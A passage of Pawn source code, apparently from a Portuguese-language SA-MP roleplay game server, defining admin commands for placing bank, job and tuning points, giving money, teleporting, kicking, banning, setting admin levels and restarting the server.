    if(sscanf(params, "d", id)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/abankpos <id (1-2)>");
    if(id <= 0 || id > 2) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");
    
	new Float:x, Float:y, Float:z, VW, Int;

	GetPlayerPos(playerid, x, y, z);
	VW = GetPlayerVirtualWorld(playerid);
	Int = GetPlayerInterior(playerid);
    
	switch(id)
	{
	    case 1:
	    {
    		DestroyDynamicPickup(BancoPickup[0]);
  			DestroyDynamic3DTextLabel(BancoLabel[0]);
  			
			oInfo[0][Banco1X] = x;
			oInfo[0][Banco1Y] = y;
			oInfo[0][Banco1Z] = z;
			oInfo[0][Banco1VirtualWorld] = VW;
			oInfo[0][Banco1Interior] = Int;

        	BancoPickup[0] = CreateDynamicPickup(oInfo[0][Banco1PickupID], 1, oInfo[0][Banco1X], oInfo[0][Banco1Y], oInfo[0][Banco1Z], -1, -1, -1, 100.0);
        	BancoLabel[0] = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Banco {99FF00}]\n 'n'", COLOR_WHITE, oInfo[0][Banco1X], oInfo[0][Banco1Y], oInfo[0][Banco1Z], 10, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);

            SendClientMessage(playerid, COLOR_CHAT, "Puxaste a posição do Banco 1 para ti");
		}
		case 2:
		{
    		DestroyDynamicPickup(BancoPickup[1]);
  			DestroyDynamic3DTextLabel(BancoLabel[1]);

			oInfo[0][Banco2X] = x;
			oInfo[0][Banco2Y] = y;
			oInfo[0][Banco2Z] = z;
			oInfo[0][Banco2VirtualWorld] = VW;
			oInfo[0][Banco2Interior] = Int;
			
        	BancoPickup[1] = CreateDynamicPickup(oInfo[0][Banco2PickupID], 1, oInfo[0][Banco2X], oInfo[0][Banco2Y], oInfo[0][Banco2Z], -1, -1, -1, 100.0);
        	BancoLabel[1] = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Banco {99FF00}]\n 'n'", COLOR_WHITE, oInfo[0][Banco2X], oInfo[0][Banco2Y], oInfo[0][Banco2Z], 10, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);

            SendClientMessage(playerid, COLOR_CHAT, "Puxaste a posição do Banco 2 para ti");
		}
	}

    return 1;
}

COMMAND:atuningpos(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

 	DestroyDynamicPickup(TunningPickup);
  	DestroyDynamic3DTextLabel(TunningLabel);

	new Float:x, Float:y, Float:z, VW, Int;

	GetPlayerPos(playerid, x, y, z);
	VW = GetPlayerVirtualWorld(playerid);
	Int = GetPlayerInterior(playerid);

	oInfo[0][TunningX] = x;
	oInfo[0][TunningY] = y;
	oInfo[0][TunningZ] = z;
	oInfo[0][TunningVirtualWorld] = VW;
	oInfo[0][TunningInterior] = Int;
	
	TunningPickup = CreateDynamicPickup(oInfo[0][TunningPickupID], 1, oInfo[0][TunningX], oInfo[0][TunningY], oInfo[0][TunningZ], -1, -1, -1, 100.0);
	TunningLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Zona de Tuning {99FF00}]\n 'n'", COLOR_WHITE, oInfo[0][TunningX], oInfo[0][TunningY], oInfo[0][TunningZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);

	SendClientMessage(playerid, COLOR_CHAT, "Puxaste a posição de Tuning para ti");

    return 1;
}

COMMAND:aentregarmateriaispos(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new Float:x, Float:y, Float:z, VW, Int;

	GetPlayerPos(playerid, x, y, z);
	VW = GetPlayerVirtualWorld(playerid);
	Int = GetPlayerInterior(playerid);

	oInfo[0][EntregarMateriaisX] = x;
	oInfo[0][EntregarMateriaisY] = y;
	oInfo[0][EntregarMateriaisZ] = z;
	oInfo[0][EntregarMateriaisVirtualWorld] = VW;
	oInfo[0][EntregarMateriaisInterior] = Int;

	SendClientMessage(playerid, COLOR_CHAT, "Puxaste a posição de Entregar Materiais para ti");

    return 1;
}

COMMAND:acomprarmateriaispos(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new Float:x, Float:y, Float:z, VW, Int;

	GetPlayerPos(playerid, x, y, z);
	VW = GetPlayerVirtualWorld(playerid);
	Int = GetPlayerInterior(playerid);

	oInfo[0][ComprarMateriaisX] = x;
	oInfo[0][ComprarMateriaisY] = y;
	oInfo[0][ComprarMateriaisZ] = z;
	oInfo[0][ComprarMateriaisVirtualWorld] = VW;
	oInfo[0][ComprarMateriaisInterior] = Int;

	SendClientMessage(playerid, COLOR_CHAT, "Puxaste a posição de Comprar Materiais para ti");

    return 1;
}

COMMAND:aentregardrogaspos(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new Float:x, Float:y, Float:z, VW, Int;

	GetPlayerPos(playerid, x, y, z);
	VW = GetPlayerVirtualWorld(playerid);
	Int = GetPlayerInterior(playerid);

	oInfo[0][EntregarDrogasX] = x;
	oInfo[0][EntregarDrogasY] = y;
	oInfo[0][EntregarDrogasZ] = z;
	oInfo[0][EntregarDrogasVirtualWorld] = VW;
	oInfo[0][EntregarDrogasInterior] = Int;
	
	SendClientMessage(playerid, COLOR_CHAT, "Puxaste a posição de Entregar Drogas para ti");

    return 1;
}

COMMAND:acomprardrogapos(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new Float:x, Float:y, Float:z, VW, Int;

	GetPlayerPos(playerid, x, y, z);
	VW = GetPlayerVirtualWorld(playerid);
	Int = GetPlayerInterior(playerid);

	oInfo[0][ComprarDrogasX] = x;
	oInfo[0][ComprarDrogasY] = y;
	oInfo[0][ComprarDrogasZ] = z;
	oInfo[0][ComprarDrogasVirtualWorld] = VW;
	oInfo[0][ComprarDrogasInterior] = Int;
	
	SendClientMessage(playerid, COLOR_CHAT, "Puxaste a posição de Comprar Drogas para ti");

    return 1;
}

COMMAND:acepos(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

 	DestroyDynamicPickup(CEPickup);
  	DestroyDynamic3DTextLabel(CELabel);

	new Float:x, Float:y, Float:z, VW, Int;

	GetPlayerPos(playerid, x, y, z);
	VW = GetPlayerVirtualWorld(playerid);
	Int = GetPlayerInterior(playerid);

	oInfo[0][EmpregoX] = x;
	oInfo[0][EmpregoY] = y;
	oInfo[0][EmpregoZ] = z;
	oInfo[0][EmpregoVirtualWorld] = VW;
	oInfo[0][EmpregoInterior] = Int;
	oInfo[0][LicPickupID] = 1239;

	CEPickup = CreateDynamicPickup(oInfo[0][EmpregoPickupID], 1, oInfo[0][EmpregoX], oInfo[0][EmpregoY], oInfo[0][EmpregoZ], -1, -1, -1, 100.0);
	CELabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Centro de Emprego {99FF00}] \n {99FF00}'n'", COLOR_WHITE, oInfo[0][EmpregoX], oInfo[0][EmpregoY], oInfo[0][EmpregoZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);

	SendClientMessage(playerid, COLOR_CHAT, "Puxaste a posição do Centro de Emprego para ti");

    return 1;
}

COMMAND:aprenderpos(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

  	DestroyDynamic3DTextLabel(PrenderLabel);

	new Float:x, Float:y, Float:z, VW, Int;

	GetPlayerPos(playerid, x, y, z);
	VW = GetPlayerVirtualWorld(playerid);
	Int = GetPlayerInterior(playerid);

	oInfo[0][PrenderX] = x;
	oInfo[0][PrenderY] = y;
	oInfo[0][PrenderZ] = z;
	oInfo[0][PrenderVirtualWorld] = VW;
	oInfo[0][PrenderInterior] = Int;
	
	PrenderLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Zona de Prender {99FF00}]", COLOR_WHITE, oInfo[0][PrenderX], oInfo[0][PrenderY], oInfo[0][PrenderZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);

	SendClientMessage(playerid, COLOR_CHAT, "Puxaste a posição de prender para ti");

    return 1;
}

COMMAND:aconducaopos(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

 	DestroyDynamicPickup(LicPickup);
  	DestroyDynamic3DTextLabel(LicLabel);

	new Float:x, Float:y, Float:z, VW, Int;
	
	GetPlayerPos(playerid, x, y, z);
	VW = GetPlayerVirtualWorld(playerid);
	Int = GetPlayerInterior(playerid);
	
	oInfo[0][LicX] = x;
	oInfo[0][LicY] = y;
	oInfo[0][LicZ] = z;
	oInfo[0][LicVirtualWorld] = VW;
	oInfo[0][LicInterior] = Int;
	oInfo[0][LicPickupID] = 1239;
	
	LicPickup = CreateDynamicPickup(oInfo[0][LicPickupID], 1, oInfo[0][LicX], oInfo[0][LicY], oInfo[0][LicZ], -1, -1, -1, 100.0);
	LicLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}/licencas {99FF00}]", COLOR_WHITE, oInfo[0][LicX], oInfo[0][LicY], oInfo[0][LicZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
	
	SendClientMessage(playerid, COLOR_CHAT, "Puxaste a posição das licenças para ti");

    return 1;
}

COMMAND:dardinheiro(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new giveplayerid, dinheiro;

    if(sscanf(params, "dd", giveplayerid, dinheiro)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/dardinheiro <playerid> <dinheiro>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);

	new string[128];

	GivePlayerMoneyEx(giveplayerid, dinheiro);

	format(string, sizeof(string), "O Administrador %s deu-te %d$", GetPlayerNameEx(playerid), dinheiro);
	SendClientMessage(giveplayerid, COLOR_CHAT, string);
	format(string, sizeof(string), "Deste %d$ ao jogador %s", dinheiro, GetPlayerNameEx(giveplayerid));
	SendClientMessage(playerid, COLOR_CHAT, string);

    return 1;
}

COMMAND:aduty(playerid, params[], help)
{
    if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);
    
    new string[256];
    
	if(AdminDuty[playerid] == false)
	{
	   	switch(pInfo[playerid][Admin])
		{
		    case 1,2:
			{
				format(string, sizeof(string), "O GameMaster {E8E541}%s {FFFFFF}(ID:{E8E541}%d{FFFFFF}) está agora de serviço", GetPlayerNameEx(playerid), playerid, INVALID_VEHICLE_ID, 0);
				SetPlayerColor(playerid, COLOR_GM);
    			DutyLabel[playerid] = Create3DTextLabel("{FF9900}[ {E8E541}GameMaster {FF9900}]", COLOR_GM, 0, 0, 0, 40.0, 0, 0);
			}
		    case 3,4:
			{
				format(string, sizeof(string), "O Administrador {E68D45}%s {FFFFFF}(ID:{E68D45}%d{FFFFFF}) está agora de serviço", GetPlayerNameEx(playerid), playerid, INVALID_VEHICLE_ID, 0);
				SetPlayerColor(playerid, COLOR_ADMIN);
				DutyLabel[playerid] = Create3DTextLabel("{FF9900}[ {E68D45}Administrador {FF9900}]", COLOR_GM, 0, 0, 0, 40.0, 0, 0);
			}
			case 5:
			{
				format(string, sizeof(string), "O Head Admin {00FFFB}%s {FFFFFF}(ID:{00FFFB}%d{FFFFFF}) está agora de serviço", GetPlayerNameEx(playerid), playerid, INVALID_VEHICLE_ID, 0);
				SetPlayerColor(playerid, COLOR_HADMIN);
				DutyLabel[playerid] = Create3DTextLabel("{FF9900}[ {00FFFB}Head Admin {FF9900}]", COLOR_GM, 0, 0, 0, 40.0, 0, 0);
			}

	        case 6:
			{
				format(string, sizeof(string), "O Responsável {00FF00}%s {FFFFFF}(ID:{00FF00}%d{FFFFFF}) está agora de serviço", GetPlayerNameEx(playerid), playerid, INVALID_VEHICLE_ID, 0);
				SetPlayerColor(playerid, COLOR_OWNER);
                DutyLabel[playerid] = Create3DTextLabel("{FF9900}[ {00FF00}Responsável {FF9900}]", COLOR_GM, 0, 0, 0, 40.0, 0, 0);

			}
	        case 1337:
			{
				format(string, sizeof(string), "O Scripter {00FF00}%s {FFFFFF}(ID:{00FF00}%d{FFFFFF}) está agora de serviço", GetPlayerNameEx(playerid), playerid);
				SetPlayerColor(playerid, COLOR_OWNER);
				DutyLabel[playerid] = Create3DTextLabel("{FF9900}[ {00FF00}Scripter {FF9900}]", COLOR_GM, 0, 0, 0, 40.0, 0, 0);
			}
		}
		SetPlayerSkin(playerid, 217);
  		SetPlayerHealthEx(playerid, 1000, 0);
		SetPlayerArmourEx(playerid, 1000, 0);
		
		Attach3DTextLabelToPlayer(DutyLabel[playerid], playerid, 0.0, 0.0, 0.7);
		
		AdminDuty[playerid] = true;
		
		Delete3DTextLabel(UIDLabel[playerid]);
	}
	else
	{
	   	switch(pInfo[playerid][Admin])
		{
		    case 1,2: { format(string, sizeof(string), "O GameMaster {E8E541}%s {FFFFFF}(ID:{E8E541}%d{FFFFFF}) está agora fora de serviço", GetPlayerNameEx(playerid), playerid); }
		    case 3,4: { format(string, sizeof(string), "O Administrador {E68D45}%s {FFFFFF}(ID:{E68D45}%d{FFFFFF}) está agora fora de serviço", GetPlayerNameEx(playerid), playerid); }
	        case 5: { format(string, sizeof(string), "O Head Admin {00FFFB}%s {FFFFFF}(ID:{00FFFB}%d{FFFFFF}) está agora fora de serviço", GetPlayerNameEx(playerid), playerid); }
	        case 6: { format(string, sizeof(string), "O Responsável {00FF00}%s {FFFFFF}(ID:{00FF00}%d{FFFFFF}) está agora fora de serviço", GetPlayerNameEx(playerid), playerid); }
	        case 1337: { format(string, sizeof(string), "O Scripter {00FF00}%s {FFFFFF}(ID:{00FF00}%d{FFFFFF}) está agora fora de serviço", GetPlayerNameEx(playerid), playerid); }
		}
		SetPlayerSkin(playerid, pInfo[playerid][Skin]);
		
		SetPlayerHealthEx(playerid, 50, 0);
		SetPlayerArmourEx(playerid, 0, 0);
		
		SetPlayerColor(playerid, COLOR_WHITE);
		Delete3DTextLabel(DutyLabel[playerid]);
		
		AdminDuty[playerid] = false;
		
		new suid[32];

		format(suid, sizeof(suid), "{FF0000}[ {FF9900}%d {FF0000}]", pInfo[playerid][UID]);
		UIDLabel[playerid] = Create3DTextLabel(suid, COLOR_WHITE, 0, 0, 0, 70.0, 0, 1);

		Attach3DTextLabelToPlayer(UIDLabel[playerid], playerid, 0.0, 0.0, 0.5);
 	}
	
	SendClientMessageToAll(COLOR_WHITE, string);

    return 1;
}

COMMAND:restart(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	foreach(new i : Player)
	{
		if(IsPlayerConnected(i))
		{
			GuardarJogador(i);
			Kick(i);
		}
	}
	
	GuardarServidor();
	SetTimerEx("SendRconCommand", 3000, false, "s", "exit");

    return 1;
}

COMMAND:close(playerid, params[], help)
{
    if(pInfo[playerid][Admin] != 1337) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	foreach(new i : Player)
	{
		GuardarJogador(i);
			
		CleanChat(i);
		SendClientMessage(playerid, COLOR_OOC, " >>>>> SERVIDOR A TERMINAR <<<<<");
			
		SetTimerEx("KickT", 15, false, "i", playerid);
	}

	GuardarServidor();
	
	SetTimer("CrashServer", 6000, true);

    return 1;
}

COMMAND:setadmin(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new giveplayerid, level;

    if(sscanf(params, "dd", giveplayerid, level)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/setadmin <playerid> <nível>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
    if(level < 0 || level > 1337) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Nível inválido");

	new string[128];

	pInfo[giveplayerid][Admin] = level;

	format(string, sizeof(string), "O Administrador %s colocou-te a admin level %d", GetPlayerNameEx(playerid), level);
	SendClientMessage(giveplayerid, COLOR_CHAT, string);
	format(string, sizeof(string), "Colocaste o jogador %s como admin level %d", GetPlayerNameEx(giveplayerid), level);
	SendClientMessage(playerid, COLOR_CHAT, string);

    return 1;
}

COMMAND:gotobiz(playerid, params[], help)
{
    if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id, string[128];

    if(sscanf(params, "d", id)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/gotobiz <id> ");
    if(id <= 0 || id > (MAX_BUSINESS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");

	SetPlayerVirtualWorld(playerid, bInfo[id][EnterVirtualWorld]);
	SetPlayerInterior(playerid, bInfo[id][EnterInterior]);
	SetPlayerPosEx(playerid, bInfo[id][EnterX], bInfo[id][EnterY], bInfo[id][EnterZ]);

	format(string, sizeof(string), "Foste até é loja %d", id);
	SendClientMessage(playerid, COLOR_INFO, string);

    return 1;
}

COMMAND:gotohouse(playerid, params[], help)
{
    if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id, string[128];

    if(sscanf(params, "d", id)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/gotohouse <id> ");
    if(id <= 0 || id > (MAX_CASAS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");

	SetPlayerVirtualWorld(playerid, hInfo[id][EnterVirtualWorld]);
	SetPlayerInterior(playerid, hInfo[id][EnterInterior]);
	SetPlayerPosEx(playerid, hInfo[id][EnterX], hInfo[id][EnterY], hInfo[id][EnterZ]);
	
	format(string, sizeof(string), "Foste até é casa %d", id);
	SendClientMessage(playerid, COLOR_INFO, string);

    return 1;
}

COMMAND:goto(playerid, params[], help)
{
    if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new giveplayerid;

    if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/goto <playerid> ");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);

	new Float:x, Float:y, Float:z, VW, Int;

	GetPlayerPos(giveplayerid, x, y, z);
	VW = GetPlayerVirtualWorld(giveplayerid);
	Int = GetPlayerInterior(giveplayerid);

	if(GetPlayerState(playerid) == 2)
	{
		new car = GetPlayerVehicleID(playerid);
		
		SetPlayerVirtualWorld(playerid, VW);
		SetPlayerInterior(playerid, Int);
		SetVehiclePosEx(car, x, y, z);
	}
	else
	{
		SetPlayerVirtualWorld(playerid, VW);
		SetPlayerInterior(playerid, Int);
		SetPlayerPosEx(playerid, x, y, z);
	}

    return 1;
}

COMMAND:gethere(playerid, params[], help)
{
    if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new giveplayerid;

    if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/gethere <playerid>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);

	new Float:x, Float:y, Float:z, VW, Int;

	GetPlayerPos(playerid, x, y, z);
	VW = GetPlayerVirtualWorld(playerid);
	Int = GetPlayerInterior(playerid);
	
	
	EnableAntiCheatForPlayer(giveplayerid, 2, 0);
	
	if(GetPlayerState(giveplayerid) == 2)
	{
		new car = GetPlayerVehicleID(giveplayerid);

		SetPlayerVirtualWorld(giveplayerid, VW);
		SetPlayerInterior(giveplayerid, Int);
		SetVehiclePosEx(car, x, y, z);
	}
	else
	{
		SetPlayerVirtualWorld(giveplayerid, VW);
		SetPlayerInterior(giveplayerid, Int);
		SetPlayerPosEx(giveplayerid, x, y, z);
	}
	
	EnableAntiCheatForPlayer(giveplayerid, 2, 1);

    return 1;
}

COMMAND:kick(playerid, params[], help)
{
    if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new giveplayerid, reason[32];

    if(sscanf(params, "us[16]", giveplayerid, reason)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/kick <playerid> <razão>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);

    KickPlayer(giveplayerid, GetPlayerNameEx(playerid), reason);
    sStats[0][Kicks]++;

    return 1;
}

COMMAND:freeze(playerid, params[], help)
{
    if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new giveplayerid, string[128];

    if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/freeze <playerid>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);

	TogglePlayerControllable(giveplayerid, false);
	
	format(string, sizeof(string), "O Administrador %s congelou-te", GetPlayerNameEx(playerid));
	SendClientMessage(giveplayerid, COLOR_CHAT, string);
	format(string, sizeof(string), "Congelaste o jogador %s", GetPlayerNameEx(giveplayerid));
	SendClientMessage(playerid, COLOR_CHAT, string);

    return 1;
}

COMMAND:unfreeze(playerid, params[], help)
{
    if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new giveplayerid, string[128];

    if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/unfreeze <playerid>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);

	TogglePlayerControllable(giveplayerid, true);

	format(string, sizeof(string), "O Administrador %s descongelou-te", GetPlayerNameEx(playerid));
	SendClientMessage(giveplayerid, COLOR_CHAT, string);
	format(string, sizeof(string), "Descongelaste o jogador %s", GetPlayerNameEx(giveplayerid));
	SendClientMessage(playerid, COLOR_CHAT, string);

    return 1;
}

COMMAND:ban(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 3) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new giveplayerid, reason[32];

    if(sscanf(params, "us[32]", giveplayerid, reason)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/ban <playerid> <razão>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);

    BanPlayer(giveplayerid, GetPlayerNameEx(playerid), reason);
	sStats[0][Bans]++;

    return 1;
}

COMMAND:banip(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 3) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new giveplayerid, reason[32];

    if(sscanf(params, "us[32]", giveplayerid, reason)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/banip <playerid> <razão>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);

    BanPlayerIP(giveplayerid, GetPlayerNameEx(playerid), reason);
	sStats[0][Bans]++;

    return 1;
}

COMMAND:o(playerid, params[], help)
{
	new chat[128];
	
    if(sscanf(params, "s[128]", chat)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/o <mensagem>");
    
	new string[256];
	
	switch(pInfo[playerid][Admin])
	{
	    case 0:
	    {
			if(pInfo[playerid][Golds] != 0 && pInfo[playerid][Admin] == 0)
			{
		 		format(string, sizeof(string), "(( [OOC:] VIP %s: %s ))", GetPlayerNameEx(playerid), chat);
		 		SendClientMessageToAll(0xB8CF97AA, string);
			}
			else
			{
			    if(OOCStatus == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Chat OOC desabilitado.");
			    
       			format(string, sizeof(string), "(( [OOC:] %s: %s ))", GetPlayerNameEx(playerid), chat);
	        	SendClientMessageToAll(0xEBC7EDAA, string);
			}
	    }
	    case 1,2:
	    {
	        format(string, sizeof(string), "(( [OOC:] Game Master %s: %s ))", GetPlayerNameEx(playerid), chat);
	        SendClientMessageToAll(COLOR_GM, string);
	    }
	    case 3,4:
	    {
	        format(string, sizeof(string), "(( [OOC:] Administrador %s: %s ))", GetPlayerNameEx(playerid), chat);
	        SendClientMessageToAll(COLOR_ADMIN, string);
	    }
	    case 5:
	    {
	        format(string, sizeof(string), "(( [OOC:] Head Admin %s: %s ))", GetPlayerNameEx(playerid), chat);
	        SendClientMessageToAll(COLOR_HADMIN, string);
	    }
	    case 6:
	    {
	        format(string, sizeof(string), "(( [OOC:] Responsável %s: %s ))", GetPlayerNameEx(playerid), chat);
	        SendClientMessageToAll(COLOR_OWNER, string);
	    }
	    case 1337:
	    {
	        format(string, sizeof(string), "(( [OOC:] Scripter %s: %s ))", GetPlayerNameEx(playerid), chat);
	        SendClientMessageToAll(COLOR_OWNER, string);
	    }
	}
	
    return 1;
}

COMMAND:oocstatus(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new string[128];
	
	OOCStatus = true;
	
	format(string, sizeof(string), "O chat OOC foi habilitado pelo administrador %s", GetPlayerNameEx(playerid));
	SendClientMessageToAll(-1, string);

    return 1;
}

COMMAND:abuildingcmds(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    SendClientMessage(playerid, COLOR_ERRO, "___________________________________________________________________________________________________");
    SendClientMessage(playerid, COLOR_CHAT, "[Comandos de Building:] {FFFFFF}/resetbuildings - /abuildingentrance - /abuildingint");
    SendClientMessage(playerid, COLOR_CHAT, "[Comandos de Building:] {FFFFFF}/abuildingname - /abuildinglock");
    SendClientMessage(playerid, COLOR_ERRO, "___________________________________________________________________________________________________");

    return 1;
}

COMMAND:abuildingint(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id, interior, string[128];

    if(sscanf(params, "dd", id, interior))
    {
		SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/abuildingint <id> <interior>");
		format(string, sizeof(string), "[INTS:] {FFFFFF}Polícia: %d - Câmara Municipal: %d - News: %d - Hospital: %d - Banco: %d", BUILDING_POLICIA, BUILDING_CAMARA, BUILDING_NEWS, BUILDING_HOSPITAL, BUILDING_BANCO);
		SendClientMessage(playerid, COLOR_CHAT, string);
		format(string, sizeof(string), "[INTS:] {FFFFFF}Escola de Condução: %d - Centro de Emprego: %d - Aeroporto: %d - Hospital 2: %d - Hospital 3: %d - Fábrica: %d", BUILDING_CONDUCAO, BUILDING_CE, BUILDING_AEROPORTO, BUILDING_HOSPITAL2, BUILDING_HOSPITAL3, BUILDING_FABRICA);
		SendClientMessage(playerid, COLOR_CHAT, string);
		
		return 1;
	}

    if(id <= 0 || id > (MAX_BUILDINGS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");
    if(interior < 0 || interior > 14) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Interior inválido");

    switch(interior)
    {
        case BUILDING_POLICIA:
        {
			buInfo[id][ExitX] = 1556.5632;
			buInfo[id][ExitY] = -1675.4264;
			buInfo[id][ExitZ] = 1101.0859;
			buInfo[id][ExitAngle] = 271.4001;
			
			buInfo[id][Interior] = 1;
			
			format(string, sizeof string, "Building: %d - Descrição: Polícia.", id);
			SendClientMessage(playerid, COLOR_INFO, string);
        }
        case BUILDING_BANCO:
        {
			buInfo[id][ExitX] = 1456.1158;
			buInfo[id][ExitY] = -983.8876;
			buInfo[id][ExitZ] = 996.1050;
			buInfo[id][ExitAngle] = 90.6050;

			buInfo[id][Interior] = 1;

			format(string, sizeof string, "Building: %d - Descrição: Banco.", id);
			SendClientMessage(playerid, COLOR_INFO, string);
        }
        case BUILDING_CE:
        {
			buInfo[id][ExitX] = 916.6353;
			buInfo[id][ExitY] = 2381.6392;
			buInfo[id][ExitZ] = 246.4695;
			buInfo[id][ExitAngle] = 180.0509;

			buInfo[id][Interior] = 1;

			format(string, sizeof string, "Building: %d - Descrição: Centro de Emprego.", id);
			SendClientMessage(playerid, COLOR_INFO, string);
        }
        case BUILDING_CONDUCAO:
        {
			buInfo[id][ExitX] = -2027.0022;
			buInfo[id][ExitY] = -103.8003;
			buInfo[id][ExitZ] = 1035.1719;
			buInfo[id][ExitAngle] = 180.7949;

			buInfo[id][Interior] = 3;

			format(string, sizeof string, "Building: %d - Descrição: Escola de Condução.", id);
			SendClientMessage(playerid, COLOR_INFO, string);
        }
        case BUILDING_HOSPITAL:
        {
			buInfo[id][ExitX] = 1162.0563;
			buInfo[id][ExitY] = -1309.2720;
			buInfo[id][ExitZ] = 14.4256;
			buInfo[id][ExitAngle] = 94.0283;

			buInfo[id][Interior] = 0;

			format(string, sizeof string, "Building: %d - Descrição: Hospital.", id);
			SendClientMessage(playerid, COLOR_INFO, string);
        }
        case BUILDING_CAMARA:
        {
			buInfo[id][ExitX] = 1472.5338;
			buInfo[id][ExitY] = -1726.4178;
			buInfo[id][ExitZ] = 1052.0490;
